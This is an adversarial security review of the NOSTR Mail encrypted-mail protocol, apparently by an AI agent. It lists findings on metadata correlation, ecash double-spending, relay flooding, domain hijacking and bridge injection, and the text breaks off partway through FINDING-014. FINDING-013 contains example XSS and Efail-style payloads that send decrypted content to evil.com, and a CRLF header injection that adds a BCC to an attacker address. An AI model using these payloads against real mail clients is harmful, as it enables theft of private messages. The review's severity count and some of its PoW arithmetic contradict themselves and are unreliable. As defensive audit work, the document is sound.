# Phase 2 Adversarial Security Review --- NOSTR Mail Protocol

**Review ID**: NOSTR-MAIL-P2-ASR-001
**Date**: 2026-04-01
**Reviewer**: Adversarial Security Agent (Phase 2)
**Protocol Version**: NOSTR Mail v0.1 (NIP-44 v2 + NIP-59 Gift Wrap + Cashu postage + L402 gating + NIP-13 PoW)
**Classification**: Pre-deployment adversarial security assessment
**Status**: FINAL

---

## Executive Summary

This document presents the Phase 2 adversarial security review of the NOSTR Mail protocol --- a decentralized, end-to-end encrypted mail system composed of several NOSTR Implementation Possibilities (NIPs) and supplementary economic mechanisms. The protocol layers NIP-44 v2 encryption (ECDH with secp256k1, HKDF-SHA256 key derivation, ChaCha20-Poly1305 AEAD with HMAC-SHA256 authentication), NIP-59 Gift Wrap (three-layer envelope: unsigned rumor, sender-signed seal, ephemeral-signed wrap), Cashu ecash tokens as anti-spam postage embedded inside the encryption boundary, L402 macaroon-based relay payment gating, NIP-13 proof-of-work as a free-tier alternative, kind 10050 replaceable events for mailbox relay routing, NIP-05 DNS-based addressing, Blossom for encrypted file attachments, and kind 10099 replaceable events for mailbox state synchronization.

The core cryptographic primitives are sound. NIP-44 v2 was professionally audited by Cure53 in 2023, and the individual building blocks (ChaCha20, HMAC-SHA256, secp256k1 ECDH, HKDF) are well-studied. The Gift Wrap protocol provides meaningful sender privacy through ephemeral key wrapping. However, the *composition* of these primitives introduces vulnerabilities that do not exist in any individual component. The economic anti-spam layer has a critical double-spend race condition that entirely defeats postage as a spam deterrent. Metadata protection has quantifiable gaps exploitable by relay operators and network adversaries through timing and size correlation. The SMTP bridge component inherits the full attack surface of legacy email. Entropy failures in ephemeral key generation would be catastrophic.

This review identifies **15 findings**: 1 Critical, 4 High, 6 Medium, 2 Low, and 2 Informational. The two most urgent findings --- Cashu double-spend (FINDING-002) and ephemeral key entropy failure (FINDING-012) --- must be resolved before any production deployment. Four High-severity findings (relay flooding, NIP-05 hijacking, bridge injection, and key rotation interception) require specification-level mitigations before the protocol can be considered safe for general use.

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 4 |
| Medium | 6 |
| Low | 2 |
| Informational | 2 |

---

## Scope & Methodology

### Scope

The review covers the NOSTR Mail protocol as a composed system. Each component was analyzed both in isolation and in composition with other components.

| Component | Description | Specification Source |
|-----------|-------------|-------------------|
| NIP-44 v2 | ECDH + HKDF + ChaCha20 + HMAC-SHA256 encryption | `nostr-protocol/nips` NIP-44 |
| NIP-59 | Gift Wrap three-layer envelope (rumor / seal / wrap) | `nostr-protocol/nips` NIP-59 |
| Cashu postage | Ecash tokens (NUT-00 through NUT-11) as anti-spam payment | Cashu protocol spec |
| L402 gating | Lightning macaroon + invoice for relay-level payment | L402 specification |
| NIP-13 PoW | SHA-256 hashcash proof-of-work on NOSTR events | `nostr-protocol/nips` NIP-13 |
| Kind 10050 | Replaceable event listing user's mail relay preferences | NOSTR Mail spec |
| Kind 10099 | Replaceable event for mailbox state sync (read/unread, folders) | NOSTR Mail spec |
| NIP-05 | DNS-based human-readable addressing (`user@domain`) | `nostr-protocol/nips` NIP-05 |
| Blossom | Decentralized encrypted file/attachment storage | Blossom spec |
| SMTP bridge | Bidirectional email-to-NOSTR gateway | NOSTR Mail spec |

### Out of Scope

- Individual client implementation bugs (this review is protocol-level).
- Lightning Network layer-1/layer-2 security (assumed sound).
- secp256k1 elliptic curve security (assumed sound per SafeCurves).
- Physical security of end-user devices.
- Cashu mint internal security (assumed honest-but-curious).

### Methodology

1. **Protocol decomposition**: Each component analyzed individually, then all pairwise and multi-component interactions examined for emergent vulnerabilities.
2. **Threat modeling**: Six attacker models (see below) applied to every protocol flow.
3. **Attack tree construction**: For each finding, concrete numbered steps to exploit with preconditions and outcomes.
4. **Economic analysis**: Cost/benefit modeling for spam, abuse, and denial-of-service attacks.
5. **Comparison with prior art**: Known attacks on analogous systems (Signal sealed sender, PGP email, Tor hidden services, Chaumian ecash, L402/LSAT) mapped to NOSTR Mail.

### Attacker Models

| ID | Model | Capabilities | Real-World Examples |
|----|-------|-------------|-------------------|
| A1 | **Passive relay observer** | Sees all events stored/relayed, connection metadata, IP addresses | Relay operator, law enforcement with relay access |
| A2 | **Active relay adversary** | Can inject, drop, delay, reorder, or modify events | Compromised relay, malicious relay operator |
| A3 | **Network adversary** | Observes IP-level traffic between clients and relays | ISP, state-level actor, compromised WiFi AP |
| A4 | **Malicious sender** | Controls own keys, can create arbitrary events | Spammer, phisher, griefer |
| A5 | **Compromised mint** | Controls the Cashu mint used for postage tokens | Malicious mint operator, compromised mint server |
| A6 | **Bridge adversary** | Controls or compromises the SMTP bridge | Attacker with access to bridge infrastructure |

---

## Findings

---

### FINDING-001: Timing Correlation Attack on Gift Wrap

- **Severity**: Medium
- **Component**: Encryption / Delivery
- **Description**: NIP-59 Gift Wrap randomizes the `created_at` timestamp within the event to prevent timestamp-based sender identification. However, relay operators observe the *real* time at which events are submitted over the WebSocket connection. A relay operator (attacker model A1) or network adversary (A3) can correlate the submission time of a kind 1059 event with the known online presence patterns of potential senders, progressively narrowing the anonymity set.
- **Attack Steps**:
  1. Relay operator instruments the WebSocket ingestion path to log the exact wall-clock time each kind 1059 event is received.
  2. Relay operator logs the IP address (and NIP-42 AUTH identity, if present) of the submitting connection.
  3. For each kind 1059 event addressed to a target recipient (via the `p` tag), the operator builds a candidate set of senders: all clients that were connected or recently connected at submission time.
  4. Over N observations (N kind 1059 events to the same recipient over days or weeks), the operator intersects the candidate sets.
  5. The intersection converges on the true sender (or a small set of candidates).
  6. If the sender authenticates with NIP-42 AUTH, the operator immediately knows the sender's pubkey without any intersection analysis.
- **Impact**: Sender deanonymization despite ephemeral keys. Communication graph reconstruction. Defeats the core privacy guarantee of Gift Wrap against relay-operator-level adversaries.
- **Likelihood**: High for relay operators (trivial to instrument); moderate for network adversaries (requires traffic analysis capability). Feasibility increases with the number of observations and decreases with the number of concurrent connected clients.
- **Recommended Mitigation**:
  1. Clients SHOULD add a uniformly random delay of 0--300 seconds before publishing any kind 1059 event.
  2. Clients SHOULD connect to submission relays via Tor or a VPN to obscure IP addresses.
  3. Clients SHOULD NOT use NIP-42 AUTH when submitting kind 1059 events; prefer PoW or Cashu for relay access.
  4. Clients MAY periodically generate and submit dummy kind 1059 events (encrypted to self, silently discarded on receipt) to create cover traffic.
  5. Batched publishing: accumulate outbound wraps and submit them in a single burst at a random time, mixing genuine and dummy events.
- **Status**: Open

---

### FINDING-002: Cashu Double-Spend Race Condition

- **Severity**: Critical
- **Component**: Anti-Spam
- **Description**: When a sender creates a Cashu ecash token and embeds it inside the NIP-44 encrypted rumor content, the sender retains full knowledge of the token secret. The token is a bearer instrument: whoever presents it to the mint first can redeem it. There is an inherent race condition between the sender (who knows the token immediately) and the recipient (who must receive the event, decrypt it, parse it, and then contact the mint). The sender will always win this race if they choose to exploit it.
- **Attack Steps**:
  1. Attacker generates a Cashu token worth N sats from mint M.
  2. Attacker embeds the token in a NOSTR Mail rumor, encrypts with NIP-44, wraps with NIP-59, and publishes the kind 1059 event to the recipient's relay.
  3. Immediately after publishing (or even before), the attacker redeems the same token at mint M using the token secret they retained.
  4. Mint M marks the token as spent.
  5. Hours or days later, the recipient retrieves the event, decrypts the rumor, extracts the Cashu token, and attempts to redeem it at mint M.
  6. Mint M rejects the token as already spent.
  7. The attacker has sent "postage-paid" mail that cost them nothing. The anti-spam mechanism is entirely defeated.
- **Impact**: The entire Cashu postage anti-spam model collapses. Spammers can send unlimited mail with zero effective cost. Recipients who rely on postage presence as a spam signal will be deceived by already-spent tokens. The economic deterrent --- the primary defense against spam at scale --- is rendered meaningless.
- **Likelihood**: Trivially exploitable. Requires no special resources, no timing precision, and no advanced knowledge. Any sender can do this with standard Cashu tooling.
- **Recommended Mitigation**:
  1. **Mandate P2PK-locked Cashu tokens (NUT-11).** The sender creates tokens locked to the recipient's NOSTR secp256k1 public key. Redemption at the mint requires a signature from the recipient's private key. The sender cannot produce this signature and therefore cannot double-spend.
  2. Implementation: `token = mint.create(amount=N, p2pk=recipient_nostr_pubkey)`. Recipient redeems: `mint.redeem(token, sig=sign(recipient_privkey, token.secret))`.
  3. Consider additionally supporting NUT-10 HTLC spending conditions as a fallback for mints that do not support NUT-11.
  4. Clients MUST attempt to swap/redeem received tokens immediately upon decryption, before presenting the message to the user, to minimize any residual window.
- **Status**: Open

---

### FINDING-003: Kind 1059 Relay Flooding (Denial of Service)

- **Severity**: High
- **Component**: Delivery
- **Description**: Gift Wrap events use ephemeral sender keys. Each kind 1059 event has a unique `pubkey` field that will never be reused. Traditional relay rate limiting --- which tracks events per pubkey per time window --- is completely ineffective against flooding because every event comes from a "new" pubkey. An attacker (model A4) can generate millions of kind 1059 events addressed to a victim's pubkey, exhausting relay storage and overwhelming the victim's client with undecryptable garbage.
- **Attack Steps**:
  1. Attacker reads the victim's kind 10050 relay list to identify their mail relays.
  2. Attacker generates ephemeral keypairs in a tight loop (cost: microseconds per keypair).
  3. For each keypair, attacker creates a kind 1059 event with `"p"` tag set to the victim's pubkey and garbage encrypted content.
  4. Attacker publishes millions of these events to the victim's relays.
  5. The relay stores all events: they are syntactically valid, properly signed, and the relay cannot determine content validity without the recipient's private key.
  6. The victim's client fetches all kind 1059 events, attempts ECDH + HKDF + HMAC verification for each, and fails on every garbage event.
  7. The victim's mailbox is flooded, their client spends minutes or hours on failed decryptions, and legitimate mail is buried.
- **Impact**: Relay storage exhaustion (1 million events at 500 bytes each = 500 MB). Victim client CPU exhaustion (~1 ms per failed ECDH/HMAC check; 1 million events = ~17 minutes of computation). Relay operators may disable kind 1059 storage entirely, censoring all NOSTR Mail for their users.
- **Likelihood**: High. Keypair generation and event signing are trivial. Without economic cost, the attack is essentially free. Attacker needs only know the victim's pubkey and relay list, both of which are public.
- **Recommended Mitigation**:
  1. **Per-recipient rate limits**: Relays SHOULD limit the rate of kind 1059 events per `p` tag (e.g., 100 per hour per recipient), regardless of sender pubkey.
  2. **Mandatory PoW on kind 1059**: Relays SHOULD require a minimum NIP-13 PoW difficulty (e.g., 20 bits) for kind 1059 events from unknown ephemeral keys.
  3. **L402 payment gating**: Relays MAY require L402 payment for kind 1059 publication, making flooding economically expensive.
  4. **Recipient-controlled allowlists**: Recipients publish a signed allowlist of pubkeys (e.g., their contact list) from whom mail is accepted without PoW or payment. Mail from unknown senders requires higher PoW or Cashu postage.
  5. **Client-side early-fail optimization**: Clients should batch-check HMAC before full decryption to reject garbage events as quickly as possible.
- **Status**: Open

---

### FINDING-004: NIP-05 Domain Hijacking for Mail Redirection

- **Severity**: High
- **Component**: Identity
- **Description**: NIP-05 resolves human-readable identifiers (`alice@example.com`) to NOSTR pubkeys by fetching `https://example.com/.well-known/nostr.json`. If an attacker compromises the DNS records or web server for the victim's NIP-05 domain, they can change the pubkey mapping. All new mail sent to `alice@example.com` will be encrypted to the attacker's pubkey and delivered to the attacker's relays. This attack is silent: neither the sender nor Alice receives any indication that interception occurred.
- **Attack Steps**:
  1. Attacker compromises DNS for `example.com` (via registrar account takeover, DNS cache poisoning, or BGP hijack) or compromises the web server hosting `/.well-known/nostr.json`.
  2. Attacker modifies the JSON to map `alice` to the attacker's own NOSTR pubkey.
  3. A sender looks up `alice@example.com`, receives the attacker's pubkey.
  4. The sender fetches the attacker's kind 10050 relay list.
  5. The sender encrypts the mail to the attacker's pubkey and delivers to the attacker's relays.
  6. The attacker decrypts and reads the mail. Alice never sees it.
  7. The attacker can respond from their own key, though the reply will come from a different pubkey than Alice's contacts expect.
- **Impact**: Complete, silent mail interception for any NIP-05 user whose domain is compromised. No error or bounce notification to the sender. Persistent until the domain is recovered.
- **Likelihood**: Moderate. Domain compromise is a known and recurring attack vector (registrar account takeover, expired domain re-registration, DNS cache poisoning). NIP-05 domains that use shared hosting or free DNS providers are at elevated risk.
- **Recommended Mitigation**:
  1. **Pubkey pinning**: Clients SHOULD cache the NIP-05-to-pubkey mapping for known contacts and display a prominent warning if the mapping changes.
  2. **Multi-source verification**: Clients SHOULD cross-reference the pubkey via multiple independent channels (kind 0 metadata, social proof, key servers, out-of-band exchange).
  3. **DNSSEC**: Domain operators SHOULD enable DNSSEC to prevent DNS-level hijacking.
  4. **Certificate Transparency monitoring**: Domain operators should monitor CT logs for unauthorized TLS certificates.
  5. **Spec recommendation**: The NOSTR Mail specification SHOULD recommend that clients treat NIP-05 resolution as a hint, not as the sole source of pubkey truth, and always prefer cached/pinned pubkeys for existing contacts.
- **Status**: Open

---

### FINDING-005: Multi-Recipient Correlation via Timing

- **Severity**: Medium
- **Component**: Encryption / Delivery
- **Description**: When a sender composes a message with multiple recipients (CC/BCC equivalent), the client creates N separate gift wraps --- one per recipient. If all N wraps are published within a short time window (typically milliseconds to seconds), a relay operator who receives multiple wraps or who correlates across relays can infer that these events are instances of the same multi-recipient message. This reveals social group membership even without decrypting any content.
- **Attack Steps**:
  1. Alice sends a message to Bob, Carol, and Dave.
  2. Alice's client creates three kind 1059 events, each with a unique ephemeral key and a different `p` tag.
  3. All three events are submitted to the same relay (or to relays operated by the same entity) within a 500ms window.
  4. The relay operator observes: three kind 1059 events, from the same IP/WebSocket connection, submitted within 500ms, with similar ciphertext sizes.
  5. The operator concludes these are multi-recipient instances of the same message.
  6. The operator now knows Bob, Carol, and Dave share a communication group.
  7. Over repeated observations, stable groups (work teams, friend circles) become identifiable.
- **Impact**: Reveals social group structures without content decryption. Combined with FINDING-001 (timing correlation), may also identify the sender.
- **Likelihood**: High for relay operators who receive multiple recipients' wraps. Lower when recipients use different relays operated by independent parties.
- **Recommended Mitigation**:
  1. Clients SHOULD add independently sampled random delays (e.g., 10--120 seconds) between submitting gift wraps for different recipients.
  2. Clients SHOULD submit each recipient's wrap to a different relay where possible, using the recipient's kind 10050 preferred relays rather than a single shared relay.
  3. Clients SHOULD use different Tor circuits or VPN exit nodes for each submission.
  4. Clients SHOULD NOT submit multi-recipient wraps on the same WebSocket connection.
- **Status**: Open

---

### FINDING-006: Multi-Recipient Correlation via Ciphertext Size

- **Severity**: Low
- **Component**: Encryption
- **Description**: When the same plaintext rumor is encrypted to multiple recipients, the resulting ciphertexts --- even after NIP-44's power-of-2 padding --- will have similar or identical padded sizes. An observer who sees multiple kind 1059 events with the same padded ciphertext length, arriving in temporal proximity, can infer they carry the same underlying message.
- **Attack Steps**:
  1. Alice sends a 1,000-byte message to Bob, Carol, and Dave.
  2. NIP-44 pads the plaintext to the next power of 2 (1,024 bytes) for all three encryptions.
  3. All three kind 1059 events have ciphertext of the same length (1,024 + nonce + HMAC overhead).
  4. A relay operator observes three kind 1059 events of identical size arriving within a time window.
  5. Combined with FINDING-005, the correlation confidence increases.
- **Impact**: Strengthens multi-recipient correlation when combined with timing analysis. On its own, size correlation has high false-positive rates (many unrelated messages will have the same padded size).
- **Likelihood**: Low as a standalone attack. Meaningful only when combined with timing correlation (FINDING-005).
- **Recommended Mitigation**:
  1. Clients SHOULD add random additional padding (beyond NIP-44 standard padding) independently for each recipient's wrap. For example, append 0--512 random bytes before encryption.
  2. This breaks size correlation while preserving the benefits of power-of-2 padding for individual messages.
- **Status**: Open

---

### FINDING-007: Mailbox State Replay Attack

- **Severity**: Medium
- **Component**: State
- **Description**: Kind 10099 events use replaceable event semantics (NIP-01): the event with the highest `created_at` timestamp wins. An attacker who gains the ability to publish events with a future timestamp --- or who replays an old event after corrupting the relay's stored version --- can overwrite the user's current mailbox state. Under last-write-wins (LWW) semantics, an event with a `created_at` set far in the future would take precedence over all subsequent legitimate state updates.
- **Attack Steps**:
  1. At time T1, user's kind 10099 event records: 200 messages read, 5 folders configured.
  2. At time T2 > T1, user updates state to: 350 messages read, 8 folders.
  3. Attacker obtains the user's private key (via compromise) or exploits a relay bug that allows publishing events with forged pubkeys.
  4. Attacker publishes a kind 10099 event with `created_at` set to T3 = T2 + 1 year, containing an empty or malicious state.
  5. The relay accepts this event (it has the highest `created_at`).
  6. All of the user's clients sync the attacker's state, losing read/unread status and folder organization.
  7. The user cannot override this state without publishing a kind 10099 event with `created_at` > T3, which would require setting a timestamp even further in the future.
- **Impact**: Mailbox state reset (all messages marked unread, folders deleted). The future-timestamp poisoning makes recovery difficult --- the user must set an even more absurd future timestamp, permanently corrupting the timestamp space for this event kind.
- **Likelihood**: Low under normal conditions (requires key compromise or relay exploit). The future-timestamp variant is the most dangerous because it persists and resists correction.
- **Recommended Mitigation**:
  1. Relays MUST reject replaceable events with `created_at` more than a configurable tolerance (e.g., 15 minutes) in the future.
  2. Clients SHOULD include a monotonic counter in the encrypted content of kind 10099 events, independent of `created_at`, to detect rollback.
  3. Clients SHOULD maintain a local copy of mailbox state and treat relay state as advisory, reconciling conflicts in favor of the most recent local state.
  4. Clients SHOULD reject kind 10099 events from relays if the `created_at` is unreasonably far in the future.
- **Status**: Open

---

### FINDING-008: Draft Exfiltration via Metadata Leakage

- **Severity**: Informational
- **Component**: State
- **Description**: Draft messages stored as encrypted events (e.g., kind 30016 addressable events) on relays are encrypted to the user's own pubkey with NIP-44. A relay operator cannot decrypt the content. However, the relay operator can observe that draft events exist, track their creation and modification timestamps, observe their sizes, and detect when drafts are deleted (or replaced with sent messages). This metadata reveals the user's composition patterns.
- **Attack Steps**:
  1. User stores drafts on a relay as self-encrypted kind 30016 events.
  2. Relay operator logs draft event creation timestamps, sizes, and `d` tag values.
  3. Relay operator correlates: draft created at 09:00, modified at 09:15, deleted at 09:17, followed by a kind 1059 event at 09:18 addressed to Bob.
  4. The operator infers: the user spent 17 minutes composing a message to Bob.
  5. Over time, the operator builds a profile of the user's communication habits.
  6. In a "harvest now, decrypt later" scenario, the encrypted drafts are stored indefinitely. Future key compromise (or quantum computing) reveals the content of unsent drafts --- potentially more sensitive than sent messages.
- **Impact**: Low immediate impact. Metadata leakage about composition patterns. Long-term risk if key is later compromised.
- **Likelihood**: Trivial for relay operators. Actual content exposure requires key compromise.
- **Recommended Mitigation**:
  1. Store drafts locally only, unless the user explicitly opts into cross-device draft sync.
  2. If relay-stored drafts are required, encrypt them with a separate derived key (HKDF from main key + draft-specific salt) so main key compromise does not immediately expose drafts.
  3. Drafts stored on relays SHOULD include an NIP-40 expiration tag and be auto-deleted after a short period (e.g., 7 days).
  4. Use only a personal/trusted relay for draft storage, never a public relay.
- **Status**: Open

---

### FINDING-009: PoW GPU/ASIC Bypass

- **Severity**: Medium
- **Component**: Anti-Spam
- **Description**: NIP-13 proof-of-work uses SHA-256 hashcash, which is trivially parallelizable and for which purpose-built ASIC hardware exists (Bitcoin mining equipment). A well-resourced attacker with GPU or ASIC access can produce valid high-difficulty PoW events orders of magnitude faster than legitimate users on consumer CPUs and mobile devices. This creates an asymmetry that fundamentally undermines PoW as a spam deterrent.
- **Attack Steps**:
  1. Relay requires 24-bit NIP-13 PoW on kind 1059 events.
  2. A legitimate mobile user computes 24-bit PoW in approximately 16 seconds.
  3. An attacker rents an RTX 4090 GPU ($0.50/hour) and computes 24-bit PoW in approximately 0.016 seconds --- 1,000x faster.
  4. An attacker with access to a Bitcoin ASIC (100 TH/s) computes 24-bit PoW in approximately 0.0001 seconds --- 160,000x faster.
  5. The attacker can produce approximately 3,600 valid events per hour on GPU at negligible cost.
  6. Any PoW difficulty high enough to meaningfully slow a GPU attacker (e.g., 40+ bits) renders the system unusable for legitimate mobile users (who would need hours per event).
- **Impact**: PoW as a standalone anti-spam mechanism is economically broken. The difficulty cannot be set to a level that simultaneously deters GPU attackers and remains usable for CPU-bound legitimate users. The asymmetry is structural and cannot be solved by adjusting difficulty.
- **Likelihood**: High. GPU rental is cheap and widely available. Bitcoin ASIC rental services exist. The attack requires no specialized knowledge.
- **Recommended Mitigation**:
  1. **PoW as secondary signal, not primary defense**: PoW should reduce (but not replace) the Cashu postage requirement. Example: 20-bit PoW reduces required postage from 10 sats to 5 sats.
  2. **Adaptive difficulty**: Relays SHOULD dynamically increase required PoW difficulty when kind 1059 event volume exceeds normal thresholds.
  3. **Contact-based bypass**: Messages from contacts in the recipient's follow list (kind 3) require no PoW or postage.
  4. **Research: memory-hard PoW**: Consider replacing SHA-256 with a memory-hard function (Argon2, RandomX) that resists GPU/ASIC acceleration. This would require a NIP-13 amendment or a new NIP.
- **Status**: Open

---

### FINDING-010: Refundable Postage Abuse

- **Severity**: Low
- **Component**: Anti-Spam
- **Description**: If the protocol supports refundable postage (sender can reclaim tokens if the recipient does not read the message within a time window), a griefing/spam vector emerges. The attacker sends spam with valid postage, and if recipients ignore the spam (which is the natural response), the tokens are refunded. The attacker recycles the same funds for the next spam campaign.
- **Attack Steps**:
  1. Attacker acquires 100,000 sats worth of Cashu tokens.
  2. Attacker sends 10,000 spam messages with 10-sat postage each.
  3. Recipients receive the spam. Most ignore it (do not open/decrypt).
  4. After the refund window (e.g., 24 hours), the attacker reclaims all tokens from unopened messages.
  5. Attacker's net cost: only the tokens redeemed by recipients who opened the spam (likely a small fraction).
  6. Attacker repeats with the reclaimed tokens.
- **Impact**: The economic deterrent of postage is undermined. Recipients face a perverse incentive: they must either engage with spam (to deny the refund) or ignore it (allowing the attacker to spam for free). The attacker's per-message cost approaches zero over time.
- **Likelihood**: Medium, contingent on the protocol including a refund mechanism. If postage is burn-on-send (no refund), this finding does not apply.
- **Recommended Mitigation**:
  1. **No refund mechanism**: Postage tokens SHOULD be burn-on-send. The recipient can redeem them, but the sender has no reclaim path. This requires P2PK locking (see FINDING-002).
  2. If refunds are deemed necessary (e.g., for accidental sends), use a long lockout period (e.g., 30 days) to prevent rapid recycling.
  3. **Auto-redemption**: Clients SHOULD automatically swap/redeem tokens upon successful decryption, before presenting the message to the user, closing the refund window immediately.
  4. **Relay-held escrow**: As an alternative, the relay holds the token and releases it to the recipient upon delivery confirmation, with no sender refund path.
- **Status**: Open

---

### FINDING-011: L402 Macaroon Scope Creep

- **Severity**: Medium
- **Component**: Delivery / Anti-Spam
- **Description**: L402 authentication combines a macaroon (a capability token with attenuatable caveats) with a Lightning payment preimage. If the macaroon caveats are too broad --- for example, "the bearer can publish any kind 1059 event for 24 hours" --- a single payment enables extended abuse. The attacker pays once and gains a long window during which they can publish unlimited spam events to the relay.
- **Attack Steps**:
  1. Attacker pays a Lightning invoice to obtain an L402 credential (macaroon + preimage) from the target relay.
  2. The macaroon contains caveats: `kind = 1059`, `expires = now + 24h`. No per-recipient or per-event-count limitation.
  3. The attacker uses this credential to publish thousands of kind 1059 events over the next 24 hours.
  4. Each event targets a different victim (different `p` tag).
  5. The relay accepts all events because the macaroon is valid and the caveats are satisfied.
  6. The attacker has converted a single small Lightning payment into a mass-spam capability.
- **Impact**: L402 gating fails as an anti-spam mechanism when macaroons are over-permissive. The per-event cost drops to effectively zero.
- **Likelihood**: Depends on relay implementation. Relays that issue broad macaroons are vulnerable. Relays with tight caveats are not.
- **Recommended Mitigation**:
  1. **Tight caveats**: Macaroons MUST be scoped to: (a) a single recipient `p` tag, OR (b) a maximum event count (e.g., 10 events), AND (c) a short expiration (e.g., 10 minutes).
  2. **Per-event payment**: The ideal model is one payment per event. If batch payments are supported, the batch size should be small and explicit in the caveat.
  3. **Preimage tracking**: Relays MUST track used preimages and reject reuse (prevents replay of the same credential).
  4. **The NOSTR Mail specification SHOULD define a minimum caveat set** for L402 credentials used for kind 1059 publication.
- **Status**: Open

---

### FINDING-012: Ephemeral Key Entropy Failure

- **Severity**: Critical
- **Component**: Encryption
- **Description**: NIP-59 Gift Wrap requires a fresh random keypair for each outbound wrap. The security of the entire sender-privacy model depends on these ephemeral keys being truly random and unpredictable. If the random number generator (RNG) used by a client is weak, predictable, or has insufficient entropy, the consequences are catastrophic: ephemeral keys can be predicted or linked, destroying sender privacy and potentially revealing message content.
- **Attack Steps**:

  **Scenario A --- Ephemeral key reuse (faulty RNG)**:
  1. A client with a broken RNG (e.g., always returns the same output, or cycles through a small state space) generates the same ephemeral keypair for two or more gift wraps.
  2. An observer sees multiple kind 1059 events with the same `pubkey` field.
  3. The observer concludes all such events are from the same sender, completely defeating sender unlinkability.
  4. If the reused key appears across events to different recipients, the observer can also link the recipients.

  **Scenario B --- Predictable ephemeral keys (weak seed)**:
  1. A client seeds its PRNG with a low-entropy value (e.g., current Unix timestamp in seconds, process ID, or `Math.random()` in JavaScript).
  2. An attacker who knows or brute-forces the seed reconstructs the ephemeral private key.
  3. The attacker decrypts the outer gift wrap layer (kind 1059), revealing the seal (kind 13).
  4. The seal is signed by the sender's real pubkey. All sender privacy is destroyed.
  5. If the same weak RNG is used for NIP-44 nonce generation, nonce reuse may occur, enabling a two-time-pad attack that recovers plaintext.

  **Scenario C --- Nonce reuse in NIP-44 encryption**:
  1. The weak RNG produces a repeated nonce for two messages encrypted with the same conversation key.
  2. ChaCha20 with a repeated nonce produces the same keystream for both messages.
  3. XOR of the two ciphertexts yields XOR of the two plaintexts.
  4. Standard two-time-pad cryptanalysis (using known plaintext structure, e.g., JSON formatting) recovers both messages.

- **Impact**: Scenario A: complete loss of sender unlinkability. Scenario B: complete loss of sender privacy and potential content exposure. Scenario C: complete loss of message confidentiality for the affected pair.
- **Likelihood**: Varies by platform. High on platforms with known RNG issues (older Android, embedded systems, poorly configured server environments). Low on modern desktop/mobile platforms with proper CSPRNG (`/dev/urandom`, `crypto.getRandomValues()`, `SecRandomCopyBytes`). The risk is concentrated in alternative or hobbyist client implementations that may not follow best practices.
- **Recommended Mitigation**:
  1. **MUST-level language**: The protocol specification MUST require CSPRNG for all random value generation (ephemeral keys, nonces, padding). SHOULD is insufficient for this requirement.
  2. **Platform-specific guidance**: The spec SHOULD provide explicit guidance per platform: use `crypto.getRandomValues()` (Web), `SecRandomCopyBytes` (Apple), `getrandom(2)` (Linux), `BCryptGenRandom` (Windows), `crypto/rand` (Go), `OsRng` (Rust), `os.urandom()` (Python).
  3. **Entropy self-test**: Implementations SHOULD perform a basic entropy quality check at startup (e.g., generate 256 random bytes and verify they do not have obvious patterns like all-zeros).
  4. **Ephemeral key uniqueness check**: Clients SHOULD maintain a bloom filter or rolling set of recently used ephemeral pubkeys and abort if a duplicate is detected (indicates RNG failure).
  5. **NIP-44 nonce uniqueness**: Implementations SHOULD verify the generated nonce has not been used before with the same conversation key (at minimum, reject all-zeros nonces).
- **Status**: Open

---

### FINDING-013: Bridge HTML Injection / Cross-Site Scripting

- **Severity**: High
- **Component**: Bridge
- **Description**: The SMTP bridge converts between email (MIME) and NOSTR Mail events. Email is an extraordinarily complex format with decades of accumulated attack surface. Malicious email content --- crafted HTML, MIME multipart tricks, header injection, external resource references --- can exploit the bridge and downstream NOSTR clients if not rigorously sanitized.
- **Attack Steps**:

  **Inbound (email to NOSTR) --- HTML injection**:
  1. Attacker sends an email to a NOSTR user's bridge-provided email address.
  2. The email body contains HTML with embedded JavaScript: `<img onerror="fetch('https://evil.com/exfil?data='+document.body.innerText)" src="x">`.
  3. The bridge converts the email body to NOSTR Mail rumor content, preserving the HTML.
  4. The recipient's NOSTR client renders the HTML content.
  5. If the client does not sanitize HTML, the JavaScript executes, exfiltrating decrypted message content to the attacker's server.

  **Inbound --- Efail-style exfiltration**:
  6. Attacker sends a MIME multipart email where Part 1 opens an `<img src="https://evil.com/exfil?data=` tag, Part 2 is the encrypted content (which gets decrypted and inlined), and Part 3 closes with `">`.
  7. If the bridge or client naively concatenates parts, the decrypted content is sent as a URL parameter to the attacker's server.

  **Outbound (NOSTR to email) --- header injection**:
  8. Attacker creates a NOSTR Mail message with content containing email-like header structures (e.g., `\r\nBCC: attacker@evil.com`).
  9. The bridge naively includes this in outbound email headers.
  10. The email is sent to both the intended recipient and the attacker.

- **Impact**: Cross-site scripting in web-based NOSTR clients. Exfiltration of decrypted message content. Header injection enabling mail interception via BCC. DKIM reputation abuse via replay of bridge-signed emails.
- **Likelihood**: High. Email-based injection attacks are well-understood and widely tooled. The bridge is a high-value target because it crosses trust boundaries between the legacy email ecosystem and the NOSTR ecosystem.
- **Recommended Mitigation**:
  1. **Strict HTML sanitization**: The bridge MUST strip all active content (JavaScript, event handlers, forms, `<object>`, `<embed>`, `<iframe>`) and all external resource references (images, stylesheets, fonts) from inbound email before conversion.
  2. **Prefer Markdown**: Convert HTML email to Markdown or plaintext during bridge conversion. Only preserve safe structural elements (paragraphs, headings, lists, bold/italic).
  3. **Client-side defense in depth**: NOSTR clients MUST independently sanitize any HTML content, regardless of source. Never trust the bridge to have sanitized correctly.
  4. **CRLF stripping**: The bridge MUST strip all `\r\n` sequences from any data that could be interpreted as email headers on the outbound path.
  5. **Content-Type enforcement**: Outbound email MUST use bridge-controlled Content-Type headers. Never pass through Content-Type from NOSTR events.
  6. **From-address rewriting**: Outbound email MUST use a bridge-controlled From address (`nostr+<hash>@bridge.example.com`), never a sender-claimed address.
  7. **DKIM signature expiration**: Set the `x=` tag in DKIM signatures with a short expiry (e.g., 24 hours) to limit replay attacks.
  8. **Rate limiting**: Limit outbound email volume per NOSTR sender to prevent abuse of the bridge for bulk spam.
- **Status**: Open

---

### FINDING-014: Conversation Fingerprinting via Thread Tags

- **Severity**: Medium
- **Component**: Encryption / Delivery
- **Description**: NOSTR Mail uses thread tags (`["reply", <event_id>]`, `["thread", <root_id>]`) inside the encrypted rumor content to maintain conversation threading. While these tags are encrypted and invisible to relay operators, the *pattern* of messages between participants creates a distinguishable fingerprint. An observer who can identify that A sends to B, then B sends to A, then A sends to B again --- at characteristic intervals --- can fingerprint the conversation and distinguish it from other A-B communications.
- **Attack Steps**:
  1. Relay operator observes kind 1059 events: Event E1 from ephemeral key K1 to Bob at 09:00. Event E2 from ephemeral key K2 to Alice at 09:05. Event E3 from ephemeral key K3 to Bob at 09:12.
  2. Through timing correlation (FINDING-001), the operator has a candidate set for the sender of E1 and E3 (Alice) and E2 (Bob).
